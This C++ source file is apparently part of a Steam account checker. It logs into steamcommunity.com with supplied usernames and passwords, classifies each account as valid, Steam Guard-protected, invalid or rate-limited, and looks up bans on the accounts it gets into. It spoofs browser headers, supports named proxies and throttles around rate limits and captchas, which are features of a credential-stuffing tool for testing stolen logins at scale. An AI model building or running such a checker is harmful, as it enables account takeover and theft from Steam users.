#include "steamcheck.h"
#include "rsa.h"
#include "jsonmini.h"
#include "util.h"
#include "throttle.h"
#include "banparse.h"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <atomic>
#include <mutex>
#include <chrono>
#include <thread>
#include <random>
#include <map>
#include <ctime>

#pragma comment(lib, "winhttp.lib")

#ifndef WINHTTP_OPTION_DISABLE_FEATURES
#define WINHTTP_OPTION_DISABLE_FEATURES 63
#endif
#ifndef WINHTTP_DISABLE_COOKIES
#define WINHTTP_DISABLE_COOKIES 0x00000001
#endif

static std::wstring ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    w.resize(n ? n - 1 : 0);
    return w;
}

static std::string g_logPath;
static std::mutex g_logMtx;

static void BanLog(const std::string& msg) {
    std::lock_guard<std::mutex> l(g_logMtx);
    if (g_logPath.empty()) return;
    HANDLE h = CreateFileA(g_logPath.c_str(), GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    bool oversize = false;
    if (h != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz;
        oversize = GetFileSizeEx(h, &sz) && sz.QuadPart > 512 * 1024;
        CloseHandle(h);
    }
    if (oversize) DeleteFileA(g_logPath.c_str());
    time_t t = time(nullptr);
    struct tm tmv;
    localtime_s(&tmv, &t);
    char stamp[64];
    strftime(stamp, sizeof(stamp), "%Y-%m-%d %H:%M:%S", &tmv);
    util::AppendTextFile(g_logPath, std::string("[") + stamp + "] " + msg + "\n");
}

static std::string LogSafe(const std::string& s) {
    std::string out = s;
    for (size_t i = 0; i < out.size(); i++) {
        unsigned char c = (unsigned char)out[i];
        if (c < 0x20 || c > 0x7e) out[i] = '?';
    }
    return out;
}

static SteamThrottle g_thr;
static std::atomic<bool> g_banCheck{true};

namespace steamcheck {
int CurrentMinInterval() { return g_thr.CurrentInterval(); }
void ReportMinInterval(int ms) { g_thr.SetBase(ms); }
void SetBanCheck(bool on) { g_banCheck.store(on); }
void SetLogPath(const std::string& p) {
    std::lock_guard<std::mutex> l(g_logMtx);
    g_logPath = p;
}
}

struct RawResp {
    bool ok = false;
    int status = 0;
    std::string body;
    int retryAfterMs = 0;
    std::string setCookie;
};

static std::string ExtractCookies(HINTERNET hReq) {
    DWORD sz = 0;
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                        WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz,
                        WINHTTP_NO_HEADER_INDEX);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return "";
    std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
    if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                             WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz,
                             WINHTTP_NO_HEADER_INDEX)) return "";
    std::wstring raw(buf.data());
    std::string cookies;
    const wchar_t* p = raw.c_str();
    while (p && *p) {
        const wchar_t* e = wcsstr(p, L"\r\n");
        if (!e) e = p + wcslen(p);
        std::wstring line(p, e - p);
        if (line.size() >= 11) {
            std::wstring low = line;
            for (auto& c : low) c = towlower(c);
            if (low.rfind(L"set-cookie:", 0) == 0) {
                size_t colon = line.find(L':');
                if (colon != std::wstring::npos) {
                    std::wstring val = line.substr(colon + 1);
                    size_t a = 0;
                    while (a < val.size() && (val[a] == L' ' || val[a] == L'\t')) a++;
                    size_t semi = val.find(L';', a);
                    if (semi != std::wstring::npos) val = val.substr(a, semi - a);
                    else val = val.substr(a);
                    while (!val.empty() && (val.back() == L' ' || val.back() == L'\t')) val.pop_back();
                    if (!val.empty()) {
                        int n = WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1,
                                                    nullptr, 0, nullptr, nullptr);
                        std::string av(n, 0);
                        WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1, av.data(), n,
                                            nullptr, nullptr);
                        if (!av.empty() && av.back() == '\0') av.pop_back();
                        if (!cookies.empty()) cookies += "; ";
                        cookies += av;
                    }
                }
            }
        }
        if (!*e) break;
        p = e + 2;
        if (!*p) break;
    }
    return cookies;
}

class HttpSession {
public:
    ~HttpSession() { Close(); }

    bool Ensure(const std::string& proxy) {
        if (m_alive && m_proxy == proxy) return true;
        Close();
        if (proxy.empty()) {
            m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!m_h)
                m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        } else {
            std::wstring pw = ToWide(proxy);
            m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                              pw.c_str(), WINHTTP_NO_PROXY_BYPASS, 0);
        }
        if (!m_h) return false;
        WinHttpSetTimeouts(m_h, 12000, 12000, 12000, 12000);
        DWORD noCookies = WINHTTP_DISABLE_COOKIES;
        WinHttpSetOption(m_h, WINHTTP_OPTION_DISABLE_FEATURES, &noCookies,
                         sizeof(noCookies));
        m_alive = true;
        m_proxy = proxy;
        return true;
    }

    void Close() {
        if (m_h) { WinHttpCloseHandle(m_h); m_h = nullptr; }
        m_alive = false;
    }

    RawResp Post(const std::string& host, const std::string& path,
                 const std::string& body, const std::string& cookie) {
        return Request(L"POST", host, path, body, cookie);
    }

    RawResp Get(const std::string& host, const std::string& path,
                const std::string& cookie) {
        return Request(L"GET", host, path, "", cookie);
    }

private:
    RawResp Request(const wchar_t* verb, const std::string& host, const std::string& path,
                   const std::string& body, const std::string& cookie) {
        RawResp r;
        if (!m_h) return r;
        if (wcscmp(verb, L"POST") == 0)
            g_thr.WaitLoginTurn();
        else
            g_thr.WaitTurn();
        HINTERNET hConn = WinHttpConnect(m_h, ToWide(host).c_str(),
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConn) return r;
        HINTERNET hReq = WinHttpOpenRequest(hConn, verb, ToWide(path).c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
        if (!hReq) { WinHttpCloseHandle(hConn); return r; }

        std::wstring hdr = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n";
        hdr += L"Accept: text/html,application/json,*/*;q=0.01\r\n";
        hdr += L"Accept-Language: en-US,en;q=0.9\r\n";
        if (wcscmp(verb, L"POST") == 0) {
            hdr = L"Content-Type: application/x-www-form-urlencoded\r\n" + hdr;
            hdr += L"Origin: https://steamcommunity.com\r\n";
            hdr += L"Referer: https://steamcommunity.com/login/home/?goto=\r\n";
            hdr += L"X-Requested-With: XMLHttpRequest\r\n";
        }
        if (!cookie.empty()) hdr += L"Cookie: " + ToWide(cookie) + L"\r\n";

        DWORD bodyLen = (DWORD)body.size();
        if (body.empty()) bodyLen = 0;
        BOOL sent = WinHttpSendRequest(hReq, hdr.c_str(), (DWORD)-1,
                                       body.empty() ? nullptr : (LPVOID)body.data(),
                                       bodyLen, bodyLen, 0);
        if (sent && WinHttpReceiveResponse(hReq, nullptr)) {
            DWORD st = 0, sz = sizeof(st);
            WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                WINHTTP_HEADER_NAME_BY_INDEX, &st, &sz,
                                WINHTTP_NO_HEADER_INDEX);
            r.status = (int)st;
            r.retryAfterMs = ExtractRetryAfter(hReq);
            r.setCookie = ExtractCookies(hReq);
            DWORD avail = 0;
            do {
                avail = 0;
                if (!WinHttpQueryDataAvailable(hReq, &avail)) break;
                if (!avail) break;
                std::string chunk(avail, 0);
                DWORD rd = 0;
                if (!WinHttpReadData(hReq, chunk.data(), avail, &rd)) break;
                chunk.resize(rd);
                r.body += chunk;
            } while (avail > 0);
            r.ok = st >= 200 && st < 300;
        }
        WinHttpCloseHandle(hReq);
        WinHttpCloseHandle(hConn);
        return r;
    }

private:
    static int ExtractRetryAfter(HINTERNET hReq) {
        DWORD sz = 0;
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                            WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz,
                            WINHTTP_NO_HEADER_INDEX);
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return 0;
        std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
        if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                                 WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz,
                                 WINHTTP_NO_HEADER_INDEX)) return 0;
        std::wstring low(buf.data());
        for (auto& c : low) c = towlower(c);
        const wchar_t* p = wcsstr(low.c_str(), L"retry-after:");
        if (!p) return 0;
        p += 12;
        while (*p == L' ' || *p == L'\t') p++;
        wchar_t* end = nullptr;
        long v = wcstol(p, &end, 10);
        if (v > 0 && v < 300) return (int)(v * 1000);
        return 0;
    }

    HINTERNET m_h = nullptr;
    bool m_alive = false;
    std::string m_proxy;
};

static BanInfo FetchBanInfo(HttpSession& session, const std::string& steamid) {
    BanInfo bi;
    if (steamid.empty() || steamid.size() < 10) {
        BanLog("ban: skip, empty/short steamid");
        return bi;
    }
    for (int attempt = 0; attempt < 3 && !bi.banned; attempt++) {
        RawResp pr = session.Get("steamcommunity.com",
                                 "/profiles/" + steamid + "?l=english", "");
        if (pr.status == 429) {
            g_thr.ReportRateLimited(pr.retryAfterMs ? pr.retryAfterMs : 3000);
            BanLog("ban: profile 429 sid=" + steamid +
                   " retryAfter=" + std::to_string(pr.retryAfterMs));
            std::this_thread::sleep_for(std::chrono::milliseconds(900));
            continue;
        }
        if (!pr.ok || pr.body.empty()) {
            BanLog("ban: profile http=" + std::to_string(pr.status) + " len=" +
                   std::to_string(pr.body.size()) + " sid=" + steamid +
                   " attempt=" + std::to_string(attempt));
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }
        std::string low = util::ToLower(pr.body);
        if (low.find("profile could not be found") != std::string::npos ||
            low.find("profile_not_found") != std::string::npos) {
            BanLog("ban: profile not found sid=" + steamid);
            break;
        }
        bi = ParseBanHtml(pr.body);
        if (bi.banned) {
            BanLog("ban: HIT sid=" + steamid + " text=" + bi.text + " days=" +
                   std::to_string(bi.days));
            break;
        }
        size_t ap = low.find("ban on record");
        if (ap != std::string::npos) {
            size_t s = ap > 120 ? ap - 120 : 0;
            BanLog("ban: parse miss sid=" + steamid + " slice=>" +
                   LogSafe(pr.body.substr(s, 280)) + "<");
            break;
        }
        if (low.find("g_rgprofiledata") != std::string::npos ||
            low.find("profile_header") != std::string::npos) {
            BanLog("ban: clean, no ban sid=" + steamid);
            break;
        }
        BanLog("ban: no ban marker sid=" + steamid + " len=" +
               std::to_string(pr.body.size()));
        std::this_thread::sleep_for(std::chrono::milliseconds(150));
    }
    return bi;
}

static BanInfo FetchBanByName(HttpSession& session, const std::string& name) {
    BanInfo bi;
    if (name.empty()) return bi;
    RawResp pr = session.Get("steamcommunity.com",
                             "/id/" + name + "?l=english", "");
    if (pr.ok && !pr.body.empty())
        bi = ParseBanHtml(pr.body);
    if (!bi.banned) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
        RawResp xml = session.Get("steamcommunity.com",
                                  "/id/" + name + "/?xml=1", "");
        if (xml.ok && !xml.body.empty()) {
            std::string sx = util::ToLower(xml.body);
            size_t sp = sx.find("<steamid64>");
            if (sp != std::string::npos) {
                sp += 11;
                size_t e = sx.find('<', sp);
                if (e != std::string::npos && e - sp == 17) {
                    std::string sid = xml.body.substr(sp, 17);
                    BanLog("ban: name '" + name + "' resolved sid=" + sid);
                    bi = FetchBanInfo(session, sid);
                }
            }
        }
        if (!bi.banned)
            BanLog("ban: name '" + name + "' http=" + std::to_string(pr.status) +
                   " xml=" + std::to_string(xml.status) + " -> no ban");
    }
    return bi;
}

BanResult FetchBanBySteamId(const std::string& steamid) {
    HttpSession session;
    if (!session.Ensure("")) return BanResult{};
    BanInfo bi = FetchBanInfo(session, steamid);
    BanResult r;
    r.ok = bi.banned;
    r.ban = bi.text;
    r.days = bi.days;
    return r;
}

BanResult FetchBanByAccountName(const std::string& name) {
    HttpSession session;
    if (!session.Ensure("")) return BanResult{};
    BanInfo bi = FetchBanByName(session, name);
    BanResult r;
    r.ok = bi.banned;
    r.ban = bi.text;
    r.days = bi.days;
    return r;
}

static void ParseCookieJar(const std::string& c,
                           std::map<std::string, std::string>& jar) {
    size_t pos = 0;
    while (pos < c.size()) {
        size_t semi = c.find(';', pos);
        std::string pair = semi == std::string::npos ? c.substr(pos)
                                                     : c.substr(pos, semi - pos);
        size_t a = 0;
        while (a < pair.size() && (pair[a] == ' ' || pair[a] == '\t')) a++;
        size_t eq = pair.find('=', a);
        if (eq != std::string::npos) {
            std::string k = pair.substr(a, eq - a);
            std::string v = pair.substr(eq + 1);
            while (!k.empty() && (k.back() == ' ' || k.back() == '\t')) k.pop_back();
            if (!k.empty()) jar[k] = v;
        }
        if (semi == std::string::npos) break;
        pos = semi + 1;
    }
}

static std::string MergeCookies(const std::string& oldC, const std::string& newC) {
    if (oldC.empty()) return newC;
    if (newC.empty()) return oldC;
    std::map<std::string, std::string> jar;
    ParseCookieJar(oldC, jar);
    ParseCookieJar(newC, jar);
    std::string out;
    for (auto& kv : jar) {
        if (!out.empty()) out += "; ";
        out += kv.first + "=" + kv.second;
    }
    return out;
}

static std::string ModernAuthSteamId(HttpSession& session, const std::string& user,
                                     const std::string& pass, std::string& err) {
    err.clear();
    RawResp rk = session.Get("api.steampowered.com",
                             "/IAuthenticationService/GetPasswordRSAPublicKey/v1?"
                                 "account_name=" + util::UrlEncode(user), "");
    if (!rk.ok || rk.body.empty()) {
        err = "rsa http=" + std::to_string(rk.status);
        return "";
    }
    std::string mod = jsonmini::GetString(rk.body, "publickey_mod");
    std::string exp = jsonmini::GetString(rk.body, "publickey_exp");
    std::string ts = jsonmini::GetString(rk.body, "timestamp");
    if (mod.empty() || exp.empty() || ts.empty()) {
        err = "rsa fields missing";
        return "";
    }
    std::string enc = RsaEncryptPassword(mod, exp, pass);
    if (enc.empty()) {
        err = "rsa encrypt failed";
        return "";
    }
    std::string b = "account_name=" + util::UrlEncode(user) +
                    "&encrypted_password=" + util::UrlEncode(enc) +
                    "&encryption_timestamp=" + util::UrlEncode(ts) +
                    "&remember_login=false&platform=web&website_id=Community";
    RawResp br = session.Post("api.steampowered.com",
                              "/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
                              b, "");
    if (br.status == 429) {
        g_thr.ReportRateLimited(br.retryAfterMs ? br.retryAfterMs : 4500);
        err = "rate 429";
        return "";
    }
    BanLog("modern: begin user=" + user + " http=" + std::to_string(br.status) +
           " len=" + std::to_string(br.body.size()) +
           (br.body.size() <= 400 ? " body=" + LogSafe(br.body) : ""));
    if (!br.ok || br.body.empty()) {
        err = "begin http=" + std::to_string(br.status);
        return "";
    }
    std::string low = util::ToLower(br.body);
    if (low.find("invalid_password") != std::string::npos ||
        low.find("invalid password") != std::string::npos) {
        err = "invalid password";
        return "";
    }
    std::string sid = jsonmini::GetString(br.body, "steamid");
    if (sid.size() < 10) {
        err = "no steamid in response";
        return "";
    }
    return sid;
}

CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                               const std::string& proxy) {
    HttpSession session;
    if (!session.Ensure(proxy)) return {AccStatus::Error, "no session"};

    std::string cookie;

    long long ts = util::NowMs();
    std::string b1 = "username=" + util::UrlEncode(user) +
                     "&donotcache=" + std::to_string(ts);

    RawResp r1 = session.Post("steamcommunity.com", "/login/getrsakey/", b1, cookie);
    BanLog("login: rsakey user=" + user + " http=" + std::to_string(r1.status) +
           " len=" + std::to_string(r1.body.size()) +
           (r1.body.size() <= 200 ? " body=" + LogSafe(r1.body) : ""));
    if (!r1.setCookie.empty())
        cookie = MergeCookies(cookie, r1.setCookie);
    if (r1.status == 429) {
        g_thr.ReportRateLimited(r1.retryAfterMs ? r1.retryAfterMs : 4500);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r1.ok || r1.body.empty()) return {AccStatus::Error, "network"};
    if (!jsonmini::GetBool(r1.body, "success")) {
        std::string m = jsonmini::GetString(r1.body, "message");
        std::string ml = util::ToLower(m);
        if (ml.find("rate") != std::string::npos || ml.find("too many") != std::string::npos) {
            g_thr.ReportRateLimited(3500);
            return {AccStatus::RateLimited, m};
        }
        return {AccStatus::Error, m.empty() ? "no rsakey" : m};
    }
    std::string mod = jsonmini::GetString(r1.body, "publickey_mod");
    std::string exp = jsonmini::GetString(r1.body, "publickey_exp");
    std::string stamp = jsonmini::GetString(r1.body, "timestamp");
    if (mod.empty() || exp.empty() || stamp.empty()) {
        BanLog("login: rsakey bad fields user=" + user + " body=" +
               LogSafe(r1.body));
        return {AccStatus::Error, "bad key"};
    }
    std::string enc = RsaEncryptPassword(mod, exp, pass);
    if (enc.empty()) {
        BanLog("login: rsa encrypt failed user=" + user);
        return {AccStatus::Error, "crypto"};
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(140));

    std::string b2 = "username=" + util::UrlEncode(user) +
                     "&password=" + util::UrlEncode(enc) +
                     "&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=" +
                     "&rsatimestamp=" + stamp +
                     "&remember_login=false&donotcache=" + std::to_string(util::NowMs());

    RawResp r2 = session.Post("steamcommunity.com", "/login/dologin/", b2, cookie);

    if (!r2.setCookie.empty())
        cookie = MergeCookies(cookie, r2.setCookie);

    std::string sid = ExtractSteamId(r2.body);
    bool success = jsonmini::GetBool(r2.body, "success");
    bool guard = jsonmini::GetBool(r2.body, "emailauth_needed") ||
                 jsonmini::GetBool(r2.body, "requires_twofactor");
    std::string ckNames;
    {
        std::map<std::string, std::string> jar;
        ParseCookieJar(cookie, jar);
        for (auto& kv : jar)
            ckNames += (ckNames.empty() ? "" : ",") + kv.first;
    }
    BanLog("login user=" + user + " http=" + std::to_string(r2.status) +
           " len=" + std::to_string(r2.body.size()) + " sid=" +
           (sid.empty() ? "<none>" : sid) + " success=" + (success ? "1" : "0") +
           " guard=" + (guard ? "1" : "0") + " bancheck=" +
           (g_banCheck.load() ? "1" : "0") + " cookies=[" + ckNames + "]" +
           (r2.body.size() <= 300 ? " body=" + LogSafe(r2.body) : ""));

    if (r2.status == 429) {
        g_thr.ReportRateLimited(r2.retryAfterMs ? r2.retryAfterMs : 4500);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r2.ok && r2.body.empty()) return {AccStatus::Error, "network"};

    BanInfo bi;
    if (g_banCheck.load()) {
        if (sid.empty() && success) {
            sid = ExtractSteamId(cookie);
            if (!sid.empty())
                BanLog("login: sid from cookie name -> " + sid);
        }
        if (sid.empty() && success) {
            std::string err;
            std::string sid2 = ModernAuthSteamId(session, user, pass, err);
            if (!sid2.empty()) {
                sid = sid2;
                BanLog("login: sid via modern auth -> " + sid);
            } else {
                BanLog("login: modern auth failed user=" + user + " err=" + err);
            }
        }
        if (!sid.empty())
            bi = FetchBanInfo(session, sid);
        else
            BanLog("login: no sid after login/fallback, ban check skipped user=" +
                   user);
    }

    if (jsonmini::GetBool(r2.body, "success")) {
        g_thr.ReportSuccess();
        return {AccStatus::Valid, "", sid, bi.text, bi.days};
    }
    if (jsonmini::GetBool(r2.body, "emailauth_needed") ||
        jsonmini::GetBool(r2.body, "requires_twofactor")) {
        return {AccStatus::Guard, "steamguard", sid, bi.text, bi.days};
    }

    std::string msg = jsonmini::GetString(r2.body, "message");
    std::string low = util::ToLower(msg);

    if (jsonmini::GetBool(r2.body, "captcha_needed")) {
        g_thr.ReportRateLimited(3500);
        return {AccStatus::RateLimited, "captcha"};
    }
    if (low.find("rate") != std::string::npos ||
        low.find("too many") != std::string::npos ||
        low.find("try again") != std::string::npos ||
        low.find("temporarily") != std::string::npos) {
        g_thr.ReportRateLimited(3500);
        return {AccStatus::RateLimited, msg};
    }
    if (msg.empty()) {
        if (r2.body.find("incorrect") != std::string::npos)
            return {AccStatus::Invalid, "incorrect"};
        return {AccStatus::Error, "empty"};
    }
    return {AccStatus::Invalid, msg};
}
